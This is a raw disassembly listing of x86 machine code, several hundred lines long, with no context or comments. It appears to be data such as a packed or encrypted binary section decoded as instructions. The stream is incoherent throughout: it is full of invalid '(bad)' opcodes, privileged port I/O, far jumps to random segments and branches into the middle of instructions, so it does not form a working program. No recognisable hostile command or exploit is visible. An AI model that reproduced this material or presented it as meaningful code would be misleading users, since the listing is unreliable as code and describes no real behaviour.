  41a48a:	adc    edi,eax
  41a48c:	dec    ebp
  41a48d:	push   0x49
  41a48f:	out    0x61,eax
  41a491:	cs sbb esi,ebx
  41a494:	pop    eax
  41a495:	call   0x87646f6e
  41a49a:	jmp    0x41a503
  41a49c:	sub    esi,ebp
  41a49e:	pop    ss
  41a49f:	sbb    al,0xc4
  41a4a1:	ror    DWORD PTR ds:0xb26f02c1,0x13
  41a4a8:	ror    eax,cl
  41a4aa:	mov    bl,0xb6
  41a4ac:	xor    al,0xf2
  41a4ae:	fiadd  DWORD PTR [ebp-0x673618b3]
  41a4b4:	dec    ebp
  41a4b5:	pop    ebx
  41a4b6:	rol    BYTE PTR [esi+0x50],1
  41a4b9:	mov    ds:0xaf33be8e,eax
  41a4be:	push   ecx
  41a4bf:	fdivr  QWORD PTR cs:[ebx+0x2e035c6e]
  41a4c6:	into   
  41a4c7:	dec    eax
  41a4c8:	push   0x44
  41a4ca:	mov    esi,0x37ba2f1b
  41a4cf:	int    0x5a
  41a4d1:	sub    BYTE PTR [ebx],bh
  41a4d3:	and    ch,BYTE PTR cs:[edx]
  41a4d6:	xor    ebp,DWORD PTR [ebx+edi*8+0x43]
  41a4da:	cmc    
  41a4db:	pop    esp
  41a4dc:	mov    edx,0xfbeb1ebe
  41a4e1:	and    BYTE PTR [ebp-0x6ef53559],bl
  41a4e7:	pop    eax
  41a4e8:	(bad)  
  41a4e9:	test   eax,0x26efedff
  41a4ee:	xchg   edx,eax
  41a4ef:	test   BYTE PTR [ecx],dh
  41a4f1:	test   BYTE PTR [ebx-0x488d0049],dh
  41a4f7:	cwde   
  41a4f8:	add    esi,esp
  41a4fa:	mov    eax,ds:0x9d54fec8
  41a4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a500:	jae    0x41a527
  41a502:	or     bl,BYTE PTR [ebx]
  41a504:	dec    ecx
  41a505:	adc    al,0xdc
  41a507:	dec    esp
  41a508:	xchg   ebp,eax
  41a509:	add    ch,BYTE PTR [eiz*8-0x92ef396]
  41a510:	in     al,0x48
  41a512:	dec    esp
  41a513:	xchg   esp,eax
  41a514:	fsub   QWORD PTR [edx]
  41a516:	fisttp WORD PTR ss:[esi]
  41a519:	sar    DWORD PTR [eax],0x3d
  41a51c:	xchg   edx,eax
  41a51d:	sbb    ch,ch
  41a51f:	push   0x8
  41a521:	lea    ecx,[edx+0x767d91df]
  41a527:	pop    eax
  41a528:	jecxz  0x41a548
  41a52a:	pop    edi
  41a52b:	sub    al,ah
  41a52d:	xor    eax,0x89868763
  41a532:	ror    DWORD PTR [edx],cl
  41a534:	push   ds
  41a535:	stc    
  41a536:	jno    0x41a57d
  41a538:	sbb    eax,0xabf5f5a7
  41a53d:	mov    WORD PTR [edi-0x6c70841],cs
  41a543:	aad    0x90
  41a545:	and    BYTE PTR [ebx+0x21],0xca
  41a549:	ss mov esi,0xf5587cdd
  41a54f:	cmc    
  41a550:	xchg   esp,eax
  41a551:	sahf   
  41a552:	test   bh,ch
  41a554:	(bad)  
  41a555:	fiadd  WORD PTR [edi-0x56d05575]
  41a55b:	mov    ds:0x8cda561a,al
  41a560:	fld1   
  41a562:	xchg   DWORD PTR ds:0x62475f58,esp
  41a568:	jp     0x41a519
  41a56a:	mov    ds:0x298d9ac6,eax
  41a56f:	jo     0x41a5d0
  41a571:	out    0x2d,al
  41a573:	ror    DWORD PTR [ebx+0x36],0x5c
  41a577:	push   ebp
  41a578:	aam    0xc3
  41a57a:	mov    BYTE PTR [edi],dl
  41a57c:	dec    eax
  41a57d:	ror    esp,cl
  41a57f:	icebp  
  41a580:	xchg   ecx,eax
  41a581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a582:	test   DWORD PTR [esi-0x1b],esp
  41a585:	enter  0x875c,0xd6
  41a589:	loopne 0x41a540
  41a58b:	ss dec edi
  41a58d:	fwait
  41a58e:	lahf   
  41a58f:	mov    edi,0x9bf95241
  41a594:	icebp  
  41a595:	in     eax,dx
  41a596:	inc    ebp
  41a597:	mov    edi,0xfb2aa91b
  41a59c:	xor    BYTE PTR fs:[ecx],cl
  41a59f:	push   edx
  41a5a0:	inc    ebp
  41a5a1:	or     BYTE PTR [eax+0x74131160],0x4b
  41a5a8:	or     BYTE PTR [ebp-0x63],cl
  41a5ab:	pop    eax
  41a5ac:	mov    BYTE PTR [ebx-0x1e51e533],bl
  41a5b2:	enter  0xb522,0x1e
  41a5b6:	cmp    BYTE PTR [edi+0x137be597],ah
  41a5bc:	xor    eax,0xd16a49c2
  41a5c1:	xchg   esp,eax
  41a5c2:	dec    esp
  41a5c3:	test   al,0x3a
  41a5c5:	shr    ah,1
  41a5c7:	mov    ebx,0xdf100d2b
  41a5cc:	cwde   
  41a5cd:	lds    ecx,FWORD PTR [esi]
  41a5cf:	adc    eax,0x36bf9b39
  41a5d4:	push   edi
  41a5d5:	in     al,0x16
  41a5d7:	ins    BYTE PTR es:[edi],dx
  41a5d8:	sub    al,0x5d
  41a5da:	cdq    
  41a5db:	cwde   
  41a5dc:	dec    edx
  41a5dd:	xchg   DWORD PTR [ecx+eax*1-0x24],ecx
  41a5e1:	add    ah,BYTE PTR [ecx]
  41a5e3:	mov    ebx,0x8ff30ae
  41a5e8:	fs mov eax,gs:0x7e77bdd9
  41a5ef:	sub    esi,ebp
  41a5f1:	or     DWORD PTR [ecx-0xa],esi
  41a5f4:	les    ecx,FWORD PTR [eax+0x74]
  41a5f7:	xchg   BYTE PTR [edi+0x16],dh
  41a5fa:	ficomp DWORD PTR [ecx+0x4c]
  41a5fd:	les    esp,FWORD PTR [eax+0x9abbb02]
  41a603:	dec    esp
  41a604:	call   0xb574:0xcd105246
  41a60b:	hlt    
  41a60c:	mov    bh,0x8
  41a60e:	xor    eax,0xa4f047e8
  41a613:	adc    DWORD PTR [ebp-0x5b],edx
  41a616:	or     DWORD PTR [esi+0x6262ebea],esi
  41a61c:	inc    ecx
  41a61d:	iret   
  41a61e:	fidivr DWORD PTR [ecx]
  41a620:	ficom  DWORD PTR [edx+0x25]
  41a623:	xlat   BYTE PTR ds:[ebx]
  41a624:	imul   esp,DWORD PTR [ebp+0x213d1616],0xd303d4f
  41a62e:	dec    ebp
  41a62f:	repz inc edx
  41a631:	nop
  41a632:	mov    ch,0xab
  41a634:	in     eax,0xbe
  41a636:	cwde   
  41a637:	les    ecx,FWORD PTR [edx]
  41a639:	cli    
  41a63a:	mov    ebp,0x87bd5301
  41a63f:	and    al,0xd9
  41a641:	daa    
  41a642:	mov    al,0xf1
  41a644:	xor    eax,0xf9dfb600
  41a649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a64a:	aad    0xf
  41a64c:	cwde   
  41a64d:	and    esi,eax
  41a64f:	pop    edi
  41a650:	je     0x41a69d
  41a652:	dec    esp
  41a653:	dec    eax
  41a654:	cmp    al,0x49
  41a656:	jmp    0xe83ace24
  41a65b:	push   eax
  41a65c:	sub    BYTE PTR [ebx+0x3d],cl
  41a65f:	sbb    DWORD PTR [ecx+0x3da82b60],esp
  41a665:	aaa    
  41a666:	pop    eax
  41a667:	lods   eax,DWORD PTR ds:[esi]
  41a668:	popa   
  41a669:	pop    edi
  41a66a:	(bad)  
  41a66b:	dec    edi
  41a66c:	mov    edi,0x94f1f128
  41a671:	push   esp
  41a672:	sti    
  41a673:	push   edi
  41a675:	in     al,0x1
  41a677:	xor    DWORD PTR [esi+0x3c],ebx
  41a67a:	sub    bh,cl
  41a67c:	clc    
  41a67d:	add    BYTE PTR ds:0x8b889e6d,dl
  41a683:	sahf   
  41a684:	cmp    DWORD PTR [eax-0x1f14083],0xffffffd3
  41a68b:	je     0x41a61c
  41a68d:	and    ebp,DWORD PTR ds:0x2b866083
  41a693:	add    BYTE PTR [ecx-0x75152c7b],al
  41a699:	in     eax,dx
  41a69a:	xchg   ebp,eax
  41a69b:	mov    bh,0x56
  41a69d:	push   ds
  41a69e:	xor    al,0x1b
  41a6a0:	mov    ebx,DWORD PTR [edi-0x24afc820]
  41a6a6:	inc    edx
  41a6a7:	xchg   dl,bl
  41a6a9:	xchg   ebp,eax
  41a6aa:	or     DWORD PTR [edx-0x6e],esi
  41a6ad:	cs mov esi,0x6480d02e
  41a6b3:	pushf  
  41a6b4:	mov    al,ds:0xd85988c3
  41a6b9:	test   DWORD PTR cs:[ebx],ecx
  41a6bc:	scas   eax,DWORD PTR es:[edi]
  41a6bd:	mov    ds:0x4295d31e,al
  41a6c2:	cdq    
  41a6c3:	adc    DWORD PTR [eax],0x195e1c74
  41a6c9:	hlt    
  41a6ca:	addr16 jns 0x41a695
  41a6cd:	sbb    eax,0x8e376fae
  41a6d2:	jno    0x41a667
  41a6d4:	cwde   
  41a6d5:	stos   BYTE PTR es:[edi],al
  41a6d6:	pop    ecx
  41a6d7:	cmp    eax,0xd54b8d6d
  41a6dc:	inc    eax
  41a6dd:	add    BYTE PTR [ebx+edi*1+0x4bd41e3b],dh
  41a6e4:	cwde   
  41a6e5:	dec    esp
  41a6e6:	dec    ecx
  41a6e7:	add    al,0x5c
  41a6e9:	enter  0x10dd,0x56
  41a6ed:	sahf   
  41a6ee:	mov    dh,0x51
  41a6f0:	cwde   
  41a6f1:	adc    eax,0x6472addb
  41a6f6:	js     0x41a735
  41a6f8:	fidiv  DWORD PTR [ebx-0x72]
  41a6fb:	and    eax,0x4b74a2b0
  41a700:	jg     0x41a70f
  41a702:	and    DWORD PTR ds:0x2816cfcc,0x20034902
  41a70c:	sub    ch,BYTE PTR [ebp-0x28229d74]
  41a712:	clc    
  41a713:	(bad)  
  41a714:	sti    
  41a715:	pop    es
  41a716:	ret    0xb0da
  41a719:	mov    ebx,0xb3caf186
  41a71e:	jns    0x41a6b2
  41a720:	or     al,0xdc
  41a722:	(bad)  
  41a723:	mov    eax,0x1ad7900
  41a728:	fld    QWORD PTR [esi+0x3d]
  41a72b:	lods   eax,DWORD PTR ds:[esi]
  41a72c:	clc    
  41a72d:	mov    esp,DWORD PTR [ecx]
  41a72f:	lea    edi,[edx-0x7bc5bae5]
  41a735:	adc    BYTE PTR [ebx+0x8353efa],al
  41a73b:	les    ebp,FWORD PTR [edi+0x3f]
  41a73e:	xchg   esp,eax
  41a73f:	push   edi
  41a740:	icebp  
  41a741:	das    
  41a742:	sub    BYTE PTR [esi-0x42],0x25
  41a746:	mov    esi,0x1b0f14c7
  41a74b:	or     al,0x53
  41a74d:	push   esi
  41a74e:	enter  0xfba8,0x17
  41a752:	inc    eax
  41a753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a754:	(bad)  
  41a755:	jmp    0x41a789
  41a757:	mov    ebx,0xa39c8aca
  41a75c:	sub    eax,0x12ed12c9
  41a761:	adc    eax,0xfab0283c
  41a766:	lds    edi,FWORD PTR [edx-0x3ddecb07]
  41a76c:	pop    ss
  41a76d:	fst    QWORD PTR [edx]
  41a76f:	arpl   WORD PTR [ebx-0x71],bp
  41a772:	mov    bl,0xda
  41a774:	sbb    esi,0x6849528f
  41a77a:	popa   
  41a77b:	call   0x2e62:0x5d1a68de
  41a782:	and    al,0x64
  41a784:	pop    es
  41a785:	jmp    0x41a7bc
  41a787:	(bad)  
  41a788:	sub    al,0x99
  41a78a:	or     eax,0xc7aeb534
  41a78f:	inc    edx
  41a790:	cmp    al,0xf2
  41a792:	je     0x41a7ca
  41a794:	mov    al,0xb6
  41a796:	add    BYTE PTR [ebp+0x44],dl
  41a799:	pop    esi
  41a79a:	lea    ebx,[ebp+edi*1-0x2e]
  41a79e:	shr    BYTE PTR [ecx],cl
  41a7a0:	cmp    eax,0x23739e55
  41a7a5:	shr    esi,0x79
  41a7a8:	fsubr  DWORD PTR [ebp+0xb]
  41a7ab:	dec    ebp
  41a7ac:	mov    dh,0x95
  41a7ae:	pop    ds
  41a7af:	mov    ah,0xe4
  41a7b1:	das    
  41a7b2:	xchg   ecx,eax
  41a7b3:	(bad)  
  41a7b4:	repnz inc esp
  41a7b6:	aaa    
  41a7b7:	mov    ecx,0x915251e5
  41a7bc:	scas   al,BYTE PTR es:[edi]
  41a7bd:	xor    al,0xd
  41a7bf:	(bad)  
  41a7c0:	and    al,0x90
  41a7c2:	(bad)  
  41a7c3:	xchg   ecx,eax
  41a7c4:	shr    ebx,1
  41a7c6:	cwde   
  41a7c7:	xchg   eax,ebp
  41a7c9:	stos   BYTE PTR es:[di],al
  41a7cb:	inc    edi
  41a7cc:	pushf  
  41a7cd:	in     eax,dx
  41a7ce:	ret    0x5680
  41a7d1:	dec    edx
  41a7d2:	adc    BYTE PTR [ebx+ebp*2-0x350fa1d2],ah
  41a7d9:	ret    
  41a7da:	mov    esi,0x9eb9b2ff
  41a7df:	stos   DWORD PTR es:[edi],eax
  41a7e0:	cwde   
  41a7e1:	test   al,0x48
  41a7e3:	pop    ss
  41a7e4:	bound  esi,QWORD PTR [edx]
  41a7e6:	out    0x73,al
  41a7e8:	data16 mov al,ds:0xa7d39c36
  41a7ef:	cmp    al,0x3a
  41a7f1:	jb     0x41a7e4
  41a7f3:	or     ecx,DWORD PTR ds:0xb48c55e3
  41a7f9:	scas   eax,DWORD PTR es:[edi]
  41a7fa:	or     esp,DWORD PTR [edi+ecx*8]
  41a7fd:	(bad)  
  41a7fe:	mov    al,ds:0xb4813a1f
  41a803:	adc    eax,0x941f39f5
  41a808:	xchg   esi,eax
  41a809:	jecxz  0x41a7ba
  41a80b:	sub    BYTE PTR [eax],ah
  41a80d:	mov    dh,0x91
  41a80f:	xchg   bl,bl
  41a811:	jae    0x41a845
  41a813:	adc    edi,eax
  41a815:	shl    DWORD PTR [edi+0x61e40fd2],cl
  41a81b:	stc    
  41a81c:	ss pop eax
  41a81e:	in     eax,dx
  41a81f:	fiadd  WORD PTR [ecx-0x6dca0715]
  41a825:	fcmove st,st(6)
  41a827:	cli    
  41a828:	fcmovbe st,st(4)
  41a82a:	mov    esi,0x93e0bcf8
  41a82f:	test   BYTE PTR ds:0xe8560ebb,ch
  41a835:	outs   dx,BYTE PTR ds:[esi]
  41a836:	inc    eax
  41a837:	scas   eax,DWORD PTR es:[edi]
  41a838:	jae    0x41a878
  41a83a:	or     ecx,DWORD PTR [ebx]
  41a83c:	dec    edi
  41a83d:	adc    DWORD PTR [ebx-0x6d],esp
  41a840:	adc    al,0xec
  41a842:	dec    eax
  41a843:	mov    bh,BYTE PTR [esi+0x3a709c99]
  41a849:	enter  0x4084,0x74
  41a84d:	ret    0xcb71
  41a850:	sbb    DWORD PTR [eax],edi
  41a852:	xor    DWORD PTR [ebp-0x5f],edx
  41a855:	mov    ds:0xdbcd7ab9,eax
  41a85a:	push   ss
  41a85b:	lock jae 0x41a7f9
  41a85e:	dec    eax
  41a85f:	jl     0x41a858
  41a861:	push   0x7c
  41a863:	loop   0x41a7f7
  41a865:	push   esi
  41a866:	jne    0x41a865
  41a868:	clc    
  41a869:	(bad)  
  41a86a:	out    dx,eax
  41a86b:	jle    0x41a8ba
  41a86d:	mov    BYTE PTR [eax+0x6d],dl
  41a870:	pop    DWORD PTR [ecx+0x5b]
  41a873:	aam    0x5c
  41a875:	mov    edx,0x544363e0
  41a87a:	xor    DWORD PTR [ebx],edi
  41a87c:	(bad)  
  41a87d:	nop
  41a87e:	stc    
  41a87f:	jl     0x41a8d6
  41a881:	adc    al,0x46
  41a883:	push   esi
  41a884:	mov    esp,0xd1a69fb6
  41a889:	scas   al,BYTE PTR es:[edi]
  41a88a:	ror    DWORD PTR [esi+0x68b2e86e],1
  41a890:	and    eax,0xe180c840
  41a895:	xchg   ecx,eax
  41a896:	xchg   esp,eax
  41a897:	or     edx,0x46c8eb1b
  41a89d:	jb     0x41a8b5
  41a89f:	lods   al,BYTE PTR ds:[esi]
  41a8a0:	shl    BYTE PTR [ecx-0x73],cl
  41a8a3:	mov    DWORD PTR [eax-0x48e079ba],ebp
  41a8a9:	sbb    ecx,DWORD PTR [ebx+0x0]
  41a8ac:	push   ebp
  41a8ad:	add    eax,0x5b706b0
  41a8b2:	jno    0x41a8eb
  41a8b4:	jb     0x41a8f8
  41a8b6:	fsub   DWORD PTR [ecx]
  41a8b8:	mov    ebp,0x85f96e94
  41a8bd:	nop
  41a8be:	mov    ch,0x55
  41a8c0:	mov    ecx,0xdfaa44c2
  41a8c5:	ret    0x9902
  41a8c8:	xchg   esp,eax
  41a8c9:	loopne 0x41a92e
  41a8cb:	sub    BYTE PTR [eax-0x33],0xda
  41a8cf:	retf   0x9e7f
  41a8d2:	mov    BYTE PTR [edi-0x30],dh
  41a8d5:	imul   edi,ebp
  41a8d8:	jp     0x41a8a8
  41a8da:	jp     0x41a878
  41a8dc:	inc    ebp
  41a8dd:	fisttp QWORD PTR ds:[ebx+ebp*4+0x52]
  41a8e2:	push   0x76577ed6
  41a8e7:	shl    dl,0x3
  41a8ea:	imul   edi,edx,0x834ac06b
  41a8f0:	sub    DWORD PTR ds:0x7f540207,ebp
  41a8f6:	int    0xe2
  41a8f8:	sub    DWORD PTR ds:0xd91e244e,edx
  41a8fe:	out    dx,eax
  41a8ff:	sbb    cl,bh
  41a901:	ffreep st(2)
  41a903:	mov    ah,0xe9
  41a905:	inc    ebx
  41a906:	or     edi,ecx
  41a908:	js     0x41a91a
  41a90a:	js     0x41a984
  41a90c:	les    esp,FWORD PTR [ebp-0x22]
  41a90f:	dec    edx
  41a910:	jno    0x41a94a
  41a912:	mov    esp,DWORD PTR ds:[edx-0x15]
  41a916:	aaa    
  41a917:	cmp    BYTE PTR [ecx],al
  41a919:	jecxz  0x41a935
  41a91b:	daa    
  41a91c:	mov    fs,WORD PTR [eax+0x5f7b6f69]
  41a922:	xchg   ecx,eax
  41a923:	loop   0x41a99d
  41a925:	iret   
  41a926:	daa    
  41a927:	lock mov dl,0xf9
  41a92a:	mov    edi,0xddb5b1f6
  41a92f:	pop    edi
  41a930:	inc    ebp
  41a931:	and    eax,0xa061732c
  41a936:	cmc    
  41a937:	sbb    al,0xb1
  41a939:	test   eax,0x285c7ab2
  41a93e:	in     eax,dx
  41a93f:	in     al,0x15
  41a941:	call   0x84cc:0xda806559
  41a948:	mov    bh,0xcb
  41a94a:	icebp  
  41a94b:	fdiv   QWORD PTR [eax+0x5e]
  41a94e:	push   eax
  41a94f:	push   edi
  41a950:	sbb    ebx,DWORD PTR [edx-0x692a15f1]
  41a956:	and    DWORD PTR [ecx+0x1f3f89fb],ecx
  41a95c:	imul   edx,DWORD PTR [eax-0x4b],0x2e
  41a960:	xor    DWORD PTR [edi+0x2d],esi
  41a963:	pop    ebx
  41a964:	ins    BYTE PTR es:[edi],dx
  41a965:	lahf   
  41a966:	xchg   esi,eax
  41a967:	push   ds
  41a968:	cmc    
  41a969:	fisubr WORD PTR [esi+0x1]
  41a96c:	sbb    ecx,DWORD PTR [esi+0x77]
  41a96f:	push   edi
  41a970:	push   ebx
  41a971:	adc    BYTE PTR [edx-0x6892c603],bh
  41a977:	mov    ebx,0x26c95aee
  41a97c:	mov    edx,0xe6783976
  41a981:	mov    al,0xf0
  41a983:	pop    edx
  41a984:	push   0x20
  41a986:	mov    esp,0x15bbf1fc
  41a98b:	(bad)  
  41a98c:	mov    edx,0xd48428e1
  41a991:	xchg   esi,eax
  41a992:	cmc    
  41a993:	cdq    
  41a994:	xchg   esi,eax
  41a995:	outs   dx,DWORD PTR ds:[esi]
  41a996:	enter  0x1572,0x68
  41a99a:	xchg   edx,eax
  41a99b:	outs   dx,DWORD PTR ds:[esi]
  41a99c:	std    
  41a99d:	jb     0x41a9a9
  41a99f:	pop    es
  41a9a0:	(bad)  
  41a9a1:	sbb    BYTE PTR [edi-0x45],bl
  41a9a4:	sbb    edx,esi
  41a9a6:	bound  eax,QWORD PTR [edx+edx*8]
  41a9a9:	or     al,0x91
  41a9ab:	call   0xde8:0xdd6d9481
  41a9b2:	sbb    BYTE PTR [edi-0x22c88342],ah
  41a9b8:	lea    ecx,[ebp+0x7d5b221d]
  41a9be:	xchg   edx,eax
  41a9bf:	lea    ebx,[esi]
  41a9c1:	loope  0x41a9cb
  41a9c3:	imul   ecx,edi,0xffffff94
  41a9c6:	(bad)  
  41a9c7:	mov    ds:0x381e1d8b,eax
  41a9cc:	leave  
  41a9cd:	repnz cmp BYTE PTR [esi-0x48],ah
  41a9d1:	in     eax,0x46
  41a9d3:	adc    esp,DWORD PTR [edx]
  41a9d5:	fs push ebp
  41a9d7:	int    0xbb
  41a9d9:	stc    
  41a9da:	(bad)  
  41a9db:	xor    edx,edi
  41a9dd:	retfw  
  41a9df:	into   
  41a9e0:	fwait
  41a9e1:	dec    edi
  41a9e2:	jmp    FWORD PTR [eax]
  41a9e4:	or     DWORD PTR [edi+0x3a],ecx
  41a9e7:	adc    bl,cl
  41a9e9:	lock scas eax,DWORD PTR es:[edi]
  41a9eb:	leave  
  41a9ec:	xchg   DWORD PTR [esi-0x532630f1],esp
  41a9f2:	sbb    ah,BYTE PTR [ebp-0x3695b1f]
  41a9f8:	jns    0x41a9e6
  41a9fa:	mov    dl,0x58
  41a9fc:	hlt    
  41a9fd:	(bad)  
  41a9fe:	pop    ds
  41a9ff:	shl    DWORD PTR [ecx],1
  41aa01:	in     al,dx
  41aa02:	dec    ecx
  41aa03:	lahf   
  41aa04:	mov    dh,0x98
  41aa06:	in     eax,dx
  41aa07:	sub    eax,0x753c7cf4
  41aa0c:	popa   
  41aa0d:	enter  0xf512,0x49
  41aa11:	add    ch,ah
  41aa13:	test   al,0x2e
  41aa15:	jae    0x41a9ae
  41aa17:	and    cl,BYTE PTR [ebx-0x6c]
  41aa1a:	in     eax,0x13
  41aa1c:	pop    edi
  41aa1d:	adc    cl,BYTE PTR [ebp-0x3]
  41aa20:	inc    ecx
  41aa21:	cli    
  41aa22:	std    
  41aa23:	in     eax,0xee
  41aa25:	ret    
  41aa26:	xor    al,0xcb
  41aa28:	push   esi
  41aa29:	mov    al,0xac
  41aa2b:	sub    esi,edx
  41aa2d:	std    
  41aa2e:	mov    edi,ecx
  41aa30:	cmp    BYTE PTR [ebx-0x4e],al
  41aa33:	xor    al,0x6e
  41aa35:	fdivr  st,st(0)
  41aa37:	in     eax,0xf0
  41aa39:	inc    ebp
  41aa3a:	mov    ecx,0x6e84ebdb
  41aa3f:	les    ebp,FWORD PTR [edx+0x596f01fc]
  41aa45:	add    ch,cl
  41aa47:	xlat   BYTE PTR ds:[ebx]
  41aa48:	jmp    0x41a9f3
  41aa4a:	adc    al,0x4b
  41aa4c:	outs   dx,BYTE PTR ds:[esi]
  41aa4d:	dec    esi
  41aa4e:	retf   0x4cf4
  41aa51:	call   0xda0faa0f
  41aa56:	jno    0x41aa32
  41aa58:	push   esi
  41aa59:	sub    BYTE PTR [ebp-0x1e334741],ch
  41aa5f:	(bad)  
  41aa60:	dec    esi
  41aa61:	clc    
  41aa62:	add    al,0x3d
  41aa64:	test   eax,0xefe7e36e
  41aa69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa6a:	enter  0x6f23,0x7c
  41aa6e:	mov    ?,WORD PTR [ebp-0x78]
  41aa71:	mov    al,ds:0x2804a296
  41aa76:	sbb    BYTE PTR [edi+ebp*4+0x2551b40a],cl
  41aa7d:	fisubr WORD PTR [ecx+ecx*8-0x6df177ed]
  41aa84:	xor    BYTE PTR [eax+0x65],bl
  41aa87:	ins    DWORD PTR es:[edi],dx
  41aa88:	or     al,0x56
  41aa8a:	int3   
  41aa8b:	sbb    bl,BYTE PTR [esi+0xfa4dee1]
  41aa91:	aaa    
  41aa92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa93:	xchg   ebx,eax
  41aa94:	int3   
  41aa95:	stos   DWORD PTR es:[edi],eax
  41aa96:	add    ch,dl
  41aa98:	loope  0x41aa94
  41aa9a:	pop    esp
  41aa9b:	(bad)  
  41aa9d:	int    0xbe
  41aa9f:	add    al,BYTE PTR [edx-0x5374d279]
  41aaa5:	cwde   
  41aaa6:	test   DWORD PTR [edi-0x4d],esi
  41aaa9:	in     al,0xd8
  41aaab:	shl    dh,1
  41aaad:	mov    DWORD PTR [ebx+edi*2+0x7b],edi
  41aab1:	mov    esi,0x4cf1862e
  41aab6:	ins    DWORD PTR es:[edi],dx
  41aab7:	int3   
  41aab8:	fwait
  41aab9:	dec    esi
  41aaba:	adc    cl,BYTE PTR [eax]
  41aabc:	mov    edx,ecx
  41aabe:	jae    0x41aa79
  41aac0:	sbb    BYTE PTR [edx+0x1e1886b2],bh
  41aac6:	mov    ebp,DWORD PTR [ebp*1+0x1c147869]
  41aacd:	dec    edi
  41aace:	dec    ecx
  41aacf:	into   
  41aad0:	xchg   esp,eax
  41aad1:	cmc    
  41aad2:	enter  0xae9,0x75
  41aad6:	cs (bad) 
  41aad8:	mov    al,0x77
  41aada:	cmp    al,0x30
  41aadc:	(bad)  
  41aadd:	ds sbb eax,0x96051fdf
  41aae3:	jge    0x41aa65
  41aae5:	in     eax,0x93
  41aae7:	cwde   
  41aae8:	ror    edx,cl
  41aaea:	dec    DWORD PTR [ecx-0x2f3f1bca]
  41aaf0:	sbb    DWORD PTR [esi+edx*1],0x9ee81613
  41aaf7:	in     eax,0xa4
  41aaf9:	loop   0x41ab67
  41aafb:	ja     0x41ab33
  41aafd:	inc    ah
  41aaff:	es sub ebx,esp
  41ab02:	gs or  al,0xa0
  41ab05:	cmp    DWORD PTR [edi],esi
  41ab07:	cs mov edi,0xb35d3172
  41ab0d:	xchg   esp,eax
  41ab0e:	xor    ch,BYTE PTR [ebx]
  41ab10:	std    
  41ab11:	shr    bh,0x88
  41ab14:	xchg   BYTE PTR [esi-0x5f],bl
  41ab17:	psubd  mm7,QWORD PTR [ebp-0x4f6b1f68]
  41ab1e:	gs (bad) 
  41ab20:	in     eax,0x8d
  41ab22:	lahf   
  41ab23:	dec    BYTE PTR [eax]
  41ab25:	lock scas al,BYTE PTR es:[edi]
  41ab27:	jns    0x41aaac
  41ab29:	ins    BYTE PTR es:[edi],dx
  41ab2a:	push   ds
  41ab2b:	sub    DWORD PTR [ecx+ecx*1+0x6e072a30],ecx
  41ab32:	gs ja  0x41ab20
  41ab35:	and    esp,DWORD PTR [ecx+0x5130bcbe]
  41ab3b:	jmp    0x166b:0x6e98ef52
  41ab42:	test   DWORD PTR [edi],eax
  41ab44:	aas    
  41ab45:	xlat   BYTE PTR ds:[ebx]
  41ab46:	inc    ebp
  41ab47:	push   edx
  41ab48:	cmp    edi,DWORD PTR [ecx+eax*4+0x25]
  41ab4c:	scas   al,BYTE PTR es:[edi]
  41ab4d:	jecxz  0x41ab9c
  41ab4f:	ror    DWORD PTR [edi-0x3bb2f72d],0x51
  41ab56:	call   0x83d703f
  41ab5b:	aam    0x94
  41ab5d:	jge    0x41ab1a
  41ab5f:	nop
  41ab60:	fldenv [eax]
  41ab62:	xchg   ebp,eax
  41ab63:	cmp    DWORD PTR [ebx],0xffffffc8
  41ab66:	dec    edi
  41ab67:	mov    cl,0x3d
  41ab69:	pop    ds
  41ab6a:	inc    edi
  41ab6b:	sbb    DWORD PTR [ebx],esi
  41ab6d:	add    bh,BYTE PTR [eax-0x37]
  41ab70:	int3   
  41ab71:	(bad)  
  41ab72:	add    eax,0x516c8ae5
  41ab77:	pop    ebp
  41ab78:	push   ss
  41ab79:	push   ebx
  41ab7a:	adc    DWORD PTR [ebp+0x22586a3d],ebx
  41ab80:	in     eax,0x19
  41ab82:	ins    BYTE PTR es:[edi],dx
  41ab83:	adc    eax,0xbd5ecafa
  41ab88:	or     ah,BYTE PTR [eax+eax*4+0x1f]
  41ab8c:	jecxz  0x41abb4
  41ab8e:	cli    
  41ab8f:	jmp    0x62fe0026
  41ab94:	pop    edx
  41ab95:	xchg   ebx,eax
  41ab96:	daa    
  41ab97:	xor    ch,BYTE PTR [eax+0x5d0df832]
  41ab9d:	dec    eax
  41ab9e:	test   eax,0xe6fcc6d0
  41aba3:	mov    esi,0x20342c14
  41aba8:	cmp    edi,DWORD PTR [ecx-0x36]
  41abab:	es mov cl,0xc5
  41abae:	push   0xffffffb5
  41abb0:	mov    WORD PTR [eax+0x31be3897],ds
  41abb6:	aas    
  41abb7:	mov    dh,0x93
  41abb9:	icebp  
  41abba:	pop    eax
  41abbb:	or     BYTE PTR [ecx-0x25c30bbb],dh
  41abc1:	mov    esi,0xba212ed8
  41abc6:	jmp    0x73a9:0xb435be27
  41abcd:	(bad)  
  41abce:	jmp    0x28e9:0xb37ba11d
  41abd5:	sub    DWORD PTR [ebp+0x14],esp
  41abd8:	repnz stos BYTE PTR es:[edi],al
  41abda:	xlat   BYTE PTR ds:[ebx]
  41abdb:	dec    esp
  41abdc:	inc    edi
  41abdd:	arpl   WORD PTR [edx],ax
  41abdf:	inc    bx
  41abe1:	cmp    DWORD PTR [edi+0x5c],0xf
  41abe5:	fxch   st(2)
  41abe7:	into   
  41abe8:	and    BYTE PTR [esi],al
  41abea:	dec    eax
  41abeb:	xor    DWORD PTR [edx+eiz*4],0x35f289f4
  41abf2:	outs   dx,DWORD PTR ds:[esi]
  41abf4:	mov    al,BYTE PTR [esi-0x2a]
  41abf7:	out    0xf1,eax
  41abf9:	sti    
  41abfa:	aad    0x32
  41abfc:	adc    eax,0x83b8522f
  41ac01:	jae    0x41abb5
  41ac03:	sti    
  41ac04:	shr    DWORD PTR [ebx+ebx*1],cl
  41ac07:	pop    es
  41ac08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac09:	arpl   dx,cx
  41ac0b:	or     BYTE PTR [edx],ah
  41ac0d:	fild   QWORD PTR [ebx]
  41ac0f:	aam    0x27
  41ac11:	pop    ds
  41ac12:	pop    esi
  41ac13:	fwait
  41ac14:	pop    edi
  41ac15:	pop    ss
  41ac16:	inc    eax
